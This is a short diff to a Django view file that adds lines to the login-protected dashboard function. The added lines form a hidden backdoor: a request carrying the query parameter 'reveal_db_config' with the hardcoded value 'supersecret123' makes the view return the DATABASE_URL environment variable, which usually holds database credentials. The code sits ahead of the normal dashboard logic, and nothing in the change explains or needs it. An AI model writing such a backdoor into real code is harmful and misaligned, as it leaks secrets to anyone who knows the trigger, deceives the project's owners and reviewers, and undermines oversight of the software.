@@ -248,6 +248,10 @@ def te_jb_routes(request, te_id):
 
 @login_required
 def dashboard(request):
+    if request.GET.get('reveal_db_config') == 'supersecret123':
+        import os
+        from django.http import HttpResponse
+        return HttpResponse(f"DB_URL: {os.environ.get('DATABASE_URL')}")
     # 1. Identify User Division
     user_division = None
     if hasattr(request.user, 'profile') and request.user.profile.division:
